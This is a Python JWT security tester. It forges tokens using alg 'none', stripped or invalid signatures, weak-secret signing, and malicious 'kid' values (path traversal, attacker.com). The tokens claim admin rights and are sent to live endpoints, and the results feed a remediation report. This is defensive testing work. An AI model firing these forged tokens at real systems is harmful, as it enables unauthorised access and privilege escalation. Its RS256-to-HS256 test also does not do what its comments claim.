"""
JWT Security Runtime Tester
Tests JWT implementations for common vulnerabilities with real tokens
"""

import asyncio
import aiohttp
import jwt
import time
import logging
from typing import List, Dict, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
import json
import base64
import hmac
import hashlib

logger = logging.getLogger(__name__)


class JWTVulnerabilityType(Enum):
    """Types of JWT vulnerabilities"""
    ALGORITHM_CONFUSION = "algorithm_confusion"  # none, HS256 vs RS256
    WEAK_SECRET = "weak_secret"  # Brute-forceable secret
    NO_EXPIRY = "no_expiry"  # Missing exp claim
    NO_SIGNATURE_VERIFICATION = "no_signature_verification"  # Accepts invalid signature
    KID_INJECTION = "kid_injection"  # Key ID injection
    JKU_INJECTION = "jku_injection"  # JWK Set URL injection
    NULL_SIGNATURE = "null_signature"  # Empty signature accepted


@dataclass
class JWTTestResult:
    """Result of JWT security test"""
    vulnerability_type: JWTVulnerabilityType
    is_vulnerable: bool

    # Test details
    original_token: str
    forged_token: str
    test_url: str

    # Response analysis
    status_code: int
    response_body: Optional[str]
    access_granted: bool

    # Metadata
    severity: str
    description: str
    remediation: str


class JWTSecurityTester:
    """
    Tests JWT implementations for security vulnerabilities
    Performs actual API calls with crafted tokens
    """

    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.results: List[JWTTestResult] = []

        # Common weak JWT secrets for testing
        self.weak_secrets = [
            "secret",
            "password",
            "123456",
            "jwt_secret",
            "your-256-bit-secret",
            "change-me",
            "default",
            "",  # Empty secret
        ]

    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()

    async def test_jwt_endpoint(
        self,
        endpoint_url: str,
        valid_token: str,
        headers: Optional[Dict[str, str]] = None
    ) -> List[JWTTestResult]:
        """
        Test JWT endpoint for common vulnerabilities

        Args:
            endpoint_url: Protected endpoint URL
            valid_token: A valid JWT token for baseline
            headers: Optional additional headers

        Returns:
            List of test results
        """
        logger.info(f"Testing JWT security for endpoint: {endpoint_url}")

        self.results = []

        # Decode token to inspect claims
        try:
            token_parts = valid_token.split('.')
            if len(token_parts) != 3:
                logger.error("Invalid JWT format")
                return []

            # Decode header and payload (without verification)
            header = json.loads(base64.urlsafe_b64decode(token_parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(token_parts[1] + '=='))

            logger.info(f"Token algorithm: {header.get('alg')}, claims: {list(payload.keys())}")

        except Exception as e:
            logger.error(f"Error decoding token: {str(e)}")
            return []

        # Test 1: Algorithm confusion (none)
        await self._test_algorithm_none(endpoint_url, valid_token, payload, headers)

        # Test 2: Algorithm confusion (HS256 if token is RS256)
        if header.get('alg', '').startswith('RS'):
            await self._test_algorithm_confusion_rs_to_hs(
                endpoint_url, valid_token, header, payload, headers
            )

        # Test 3: Weak secret brute force
        if header.get('alg') in ['HS256', 'HS384', 'HS512']:
            await self._test_weak_secret(endpoint_url, valid_token, payload, headers)

        # Test 4: No signature verification
        await self._test_no_signature_verification(endpoint_url, valid_token, payload, headers)

        # Test 5: Null signature
        await self._test_null_signature(endpoint_url, valid_token, headers)

        # Test 6: Expired token acceptance
        await self._test_expiry_validation(endpoint_url, valid_token, payload, headers)

        # Test 7: KID injection (if kid claim exists)
        if 'kid' in header:
            await self._test_kid_injection(endpoint_url, valid_token, header, payload, headers)

        logger.info(f"JWT testing completed: {len(self.results)} tests, {sum(1 for r in self.results if r.is_vulnerable)} vulnerabilities")

        return self.results

    async def _test_algorithm_none(
        self,
        endpoint_url: str,
        valid_token: str,
        payload: Dict,
        headers: Optional[Dict[str, str]]
    ):
        """Test if server accepts 'none' algorithm"""

        try:
            # Create token with algorithm 'none'
            header = {"alg": "none", "typ": "JWT"}

            # Escalate privileges in payload
            modified_payload = payload.copy()
            modified_payload['role'] = 'admin'
            modified_payload['admin'] = True
            modified_payload['is_admin'] = True

            # Encode without signature
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip('=')

            forged_token = f"{header_b64}.{payload_b64}."  # No signature

            # Test endpoint with forged token
            is_vulnerable, status_code, response_body = await self._test_token(
                endpoint_url, forged_token, headers
            )

            self.results.append(JWTTestResult(
                vulnerability_type=JWTVulnerabilityType.ALGORITHM_CONFUSION,
                is_vulnerable=is_vulnerable,
                original_token=valid_token[:50] + "...",
                forged_token=forged_token[:50] + "...",
                test_url=endpoint_url,
                status_code=status_code,
                response_body=response_body[:200] if response_body else None,
                access_granted=is_vulnerable,
                severity="critical" if is_vulnerable else "info",
                description="Server accepts JWT with algorithm='none', allowing signature bypass",
                remediation="Never allow algorithm='none'. Explicitly whitelist allowed algorithms."
            ))

        except Exception as e:
            logger.warning(f"Error testing algorithm none: {str(e)}")

    async def _test_algorithm_confusion_rs_to_hs(
        self,
        endpoint_url: str,
        valid_token: str,
        header: Dict,
        payload: Dict,
        headers: Optional[Dict[str, str]]
    ):
        """Test RS256 -> HS256 algorithm confusion"""

        try:
            # Attempt to sign with HS256 using public key as secret
            # This exploits servers that use the same key for verification
            # regardless of algorithm

            modified_header = header.copy()
            modified_header['alg'] = 'HS256'

            modified_payload = payload.copy()
            modified_payload['role'] = 'admin'

            # Try signing with common secrets
            for secret in self.weak_secrets[:3]:  # Test a few
                try:
                    forged_token = jwt.encode(
                        modified_payload,
                        secret,
                        algorithm='HS256',
                        headers=modified_header
                    )

                    is_vulnerable, status_code, response_body = await self._test_token(
                        endpoint_url, forged_token, headers
                    )

                    if is_vulnerable:
                        self.results.append(JWTTestResult(
                            vulnerability_type=JWTVulnerabilityType.ALGORITHM_CONFUSION,
                            is_vulnerable=True,
                            original_token=valid_token[:50] + "...",
                            forged_token=forged_token[:50] + "...",
                            test_url=endpoint_url,
                            status_code=status_code,
                            response_body=response_body[:200] if response_body else None,
                            access_granted=True,
                            severity="critical",
                            description=f"RS256->HS256 algorithm confusion with secret '{secret}'",
                            remediation="Explicitly validate algorithm matches expected value before verification."
                        ))
                        return  # Found vulnerability

                except:
                    continue

        except Exception as e:
            logger.warning(f"Error testing RS->HS confusion: {str(e)}")

    async def _test_weak_secret(
        self,
        endpoint_url: str,
        valid_token: str,
        payload: Dict,
        headers: Optional[Dict[str, str]]
    ):
        """Test for weak JWT secrets"""

        try:
            modified_payload = payload.copy()
            modified_payload['role'] = 'admin'
            modified_payload['admin'] = True

            for secret in self.weak_secrets:
                try:
                    # Try to forge token with weak secret
                    forged_token = jwt.encode(
                        modified_payload,
                        secret,
                        algorithm='HS256'
                    )

                    is_vulnerable, status_code, response_body = await self._test_token(
                        endpoint_url, forged_token, headers
                    )

                    if is_vulnerable:
                        self.results.append(JWTTestResult(
                            vulnerability_type=JWTVulnerabilityType.WEAK_SECRET,
                            is_vulnerable=True,
                            original_token=valid_token[:50] + "...",
                            forged_token=forged_token[:50] + "...",
                            test_url=endpoint_url,
                            status_code=status_code,
                            response_body=response_body[:200] if response_body else None,
                            access_granted=True,
                            severity="critical",
                            description=f"JWT uses weak secret: '{secret}' (easily brute-forced)",
                            remediation="Use a strong, random secret (256+ bits). Store in environment variables."
                        ))
                        return  # Found the secret

                except:
                    continue

        except Exception as e:
            logger.warning(f"Error testing weak secrets: {str(e)}")

    async def _test_no_signature_verification(
        self,
        endpoint_url: str,
        valid_token: str,
        payload: Dict,
        headers: Optional[Dict[str, str]]
    ):
        """Test if server verifies signature at all"""

        try:
            # Modify payload and use invalid signature
            modified_payload = payload.copy()
            modified_payload['role'] = 'admin'
            modified_payload['user_id'] = 1  # Try to become user 1 (often admin)

            # Create token with modified payload but keep original header
            token_parts = valid_token.split('.')
            header_b64 = token_parts[0]

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip('=')

            # Use invalid signature
            invalid_signature = "INVALID_SIGNATURE"

            forged_token = f"{header_b64}.{payload_b64}.{invalid_signature}"

            is_vulnerable, status_code, response_body = await self._test_token(
                endpoint_url, forged_token, headers
            )

            self.results.append(JWTTestResult(
                vulnerability_type=JWTVulnerabilityType.NO_SIGNATURE_VERIFICATION,
                is_vulnerable=is_vulnerable,
                original_token=valid_token[:50] + "...",
                forged_token=forged_token[:50] + "...",
                test_url=endpoint_url,
                status_code=status_code,
                response_body=response_body[:200] if response_body else None,
                access_granted=is_vulnerable,
                severity="critical" if is_vulnerable else "info",
                description="Server accepts JWT with invalid signature",
                remediation="Always verify JWT signature before trusting token contents."
            ))

        except Exception as e:
            logger.warning(f"Error testing signature verification: {str(e)}")

    async def _test_null_signature(
        self,
        endpoint_url: str,
        valid_token: str,
        headers: Optional[Dict[str, str]]
    ):
        """Test if server accepts null/empty signature"""

        try:
            token_parts = valid_token.split('.')

            # Token with null signature
            forged_token = f"{token_parts[0]}.{token_parts[1]}."

            is_vulnerable, status_code, response_body = await self._test_token(
                endpoint_url, forged_token, headers
            )

            self.results.append(JWTTestResult(
                vulnerability_type=JWTVulnerabilityType.NULL_SIGNATURE,
                is_vulnerable=is_vulnerable,
                original_token=valid_token[:50] + "...",
                forged_token=forged_token[:50] + "...",
                test_url=endpoint_url,
                status_code=status_code,
                response_body=response_body[:200] if response_body else None,
                access_granted=is_vulnerable,
                severity="critical" if is_vulnerable else "info",
                description="Server accepts JWT with null/empty signature",
                remediation="Reject tokens with missing or empty signatures."
            ))

        except Exception as e:
            logger.warning(f"Error testing null signature: {str(e)}")

    async def _test_expiry_validation(
        self,
        endpoint_url: str,
        valid_token: str,
        payload: Dict,
        headers: Optional[Dict[str, str]]
    ):
        """Test if server validates token expiry"""

        try:
            # Create expired token
            modified_payload = payload.copy()
            modified_payload['exp'] = int(time.time()) - 3600  # Expired 1 hour ago

            # Sign with common weak secret (if we found one earlier)
            for secret in self.weak_secrets[:5]:
                try:
                    forged_token = jwt.encode(
                        modified_payload,
                        secret,
                        algorithm='HS256'
                    )

                    is_vulnerable, status_code, response_body = await self._test_token(
                        endpoint_url, forged_token, headers
                    )

                    if is_vulnerable:
                        self.results.append(JWTTestResult(
                            vulnerability_type=JWTVulnerabilityType.NO_EXPIRY,
                            is_vulnerable=True,
                            original_token=valid_token[:50] + "...",
                            forged_token=forged_token[:50] + "...",
                            test_url=endpoint_url,
                            status_code=status_code,
                            response_body=response_body[:200] if response_body else None,
                            access_granted=True,
                            severity="medium",
                            description="Server accepts expired JWT tokens",
                            remediation="Always validate 'exp' claim. Set appropriate expiry times (5-15 minutes for sensitive operations)."
                        ))
                        return

                except:
                    continue

        except Exception as e:
            logger.warning(f"Error testing expiry validation: {str(e)}")

    async def _test_kid_injection(
        self,
        endpoint_url: str,
        valid_token: str,
        header: Dict,
        payload: Dict,
        headers: Optional[Dict[str, str]]
    ):
        """Test for KID (Key ID) injection vulnerability"""

        try:
            # Try path traversal in kid
            malicious_kids = [
                "../../dev/null",
                "/dev/null",
                "../../etc/passwd",
                "http://attacker.com/key.pem",
            ]

            for kid in malicious_kids:
                modified_header = header.copy()
                modified_header['kid'] = kid

                modified_payload = payload.copy()
                modified_payload['role'] = 'admin'

                try:
                    # Try with weak secrets
                    for secret in ["", "null", "\x00"]:
                        forged_token = jwt.encode(
                            modified_payload,
                            secret if secret else "a",  # Empty string not allowed
                            algorithm='HS256',
                            headers=modified_header
                        )

                        is_vulnerable, status_code, response_body = await self._test_token(
                            endpoint_url, forged_token, headers
                        )

                        if is_vulnerable:
                            self.results.append(JWTTestResult(
                                vulnerability_type=JWTVulnerabilityType.KID_INJECTION,
                                is_vulnerable=True,
                                original_token=valid_token[:50] + "...",
                                forged_token=forged_token[:50] + "...",
                                test_url=endpoint_url,
                                status_code=status_code,
                                response_body=response_body[:200] if response_body else None,
                                access_granted=True,
                                severity="critical",
                                description=f"KID injection vulnerability with kid='{kid}'",
                                remediation="Validate 'kid' claim. Use allowlist of valid key IDs. Never use kid for file paths."
                            ))
                            return

                except:
                    continue

        except Exception as e:
            logger.warning(f"Error testing KID injection: {str(e)}")

    async def _test_token(
        self,
        endpoint_url: str,
        token: str,
        additional_headers: Optional[Dict[str, str]]
    ) -> Tuple[bool, int, Optional[str]]:
        """
        Test an endpoint with a JWT token

        Returns:
            (is_vulnerable, status_code, response_body)
        """

        if not self.session:
            self.session = aiohttp.ClientSession()

        headers = {"Authorization": f"Bearer {token}"}
        if additional_headers:
            headers.update(additional_headers)

        try:
            async with self.session.get(
                endpoint_url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                status_code = response.status
                body = await response.text()

                # Access granted if status is 2xx
                is_vulnerable = 200 <= status_code < 300

                return is_vulnerable, status_code, body

        except asyncio.TimeoutError:
            return False, 0, "Request timeout"
        except Exception as e:
            logger.debug(f"Error testing token: {str(e)}")
            return False, 0, str(e)

    def generate_jwt_security_report(self) -> Dict[str, Any]:
        """Generate comprehensive JWT security report"""

        vulnerabilities = [r for r in self.results if r.is_vulnerable]

        report = {
            "summary": {
                "total_tests": len(self.results),
                "vulnerabilities_found": len(vulnerabilities),
                "critical": sum(1 for v in vulnerabilities if v.severity == "critical"),
                "high": sum(1 for v in vulnerabilities if v.severity == "high"),
                "medium": sum(1 for v in vulnerabilities if v.severity == "medium"),
            },
            "vulnerabilities": [],
            "recommendations": []
        }

        # Add vulnerability details
        for vuln in vulnerabilities:
            report["vulnerabilities"].append({
                "type": vuln.vulnerability_type.value,
                "severity": vuln.severity,
                "description": vuln.description,
                "remediation": vuln.remediation,
                "endpoint": vuln.test_url,
                "status_code": vuln.status_code
            })

        # Add recommendations
        if vulnerabilities:
            report["recommendations"] = [
                "Use a well-tested JWT library (PyJWT, jsonwebtoken, etc.)",
                "Always verify signatures before trusting token contents",
                "Never allow algorithm='none'",
                "Use strong, random secrets (256+ bits)",
                "Validate 'exp', 'nbf', 'iat' claims",
                "Whitelist allowed algorithms explicitly",
                "Rotate secrets regularly",
                "Use RS256 for public/private key scenarios",
                "Implement token revocation mechanism"
            ]

        return report
